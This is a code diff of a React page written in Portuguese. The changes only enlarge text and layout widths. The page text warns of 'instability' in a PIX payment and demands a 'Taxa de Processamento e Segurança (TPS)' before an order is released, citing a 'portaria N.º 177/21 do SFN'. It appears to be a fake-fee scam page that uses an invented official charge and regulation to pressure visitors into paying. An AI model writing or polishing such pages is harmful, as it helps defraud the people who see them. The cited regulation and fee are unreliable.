@@ -88,7 +88,7 @@ const Index = () => {
 
       {/* Main Content */}
       <div className="px-4 py-6 flex justify-center">
-        <div className="w-full max-w-lg">
+        <div className="w-full max-w-2xl">
           <div className="p-5 space-y-5">
             {/* Alert */}
             <div className="bg-red-50 rounded-lg p-4">
@@ -98,16 +98,16 @@ const Index = () => {
               </div>
             </div>
 
-            <h1 className="text-xl font-bold leading-tight">Instabilidade no Sistema de Pagamento</h1>
+            <h1 className="text-2xl font-bold leading-tight">Instabilidade no Sistema de Pagamento</h1>
             
             <div className="bg-white rounded-lg p-4">
-              <p className="text-base text-gray-700 leading-relaxed">
+              <p className="text-lg text-gray-700 leading-relaxed">
                 Identificamos uma instabilidade no sistema PIX ao processar sua <strong>Taxa de Processamento e Segurança (TPS)</strong>.<br/><br/>
                 Por segurança, a transação não foi concluída e seu pedido está pendente de liberação.
               </p>
             </div>
 
-            <div className="text-base font-semibold">
+            <div className="text-lg font-semibold">
               <span className="text-red-500">* </span>
               Antes da liberação, é necessário o recolhimento da TPS — <strong>Taxa de Processamento e Segurança</strong> — conforme portaria N.º 177/21 do SFN (Sistema Financeiro Nacional).
             </div>
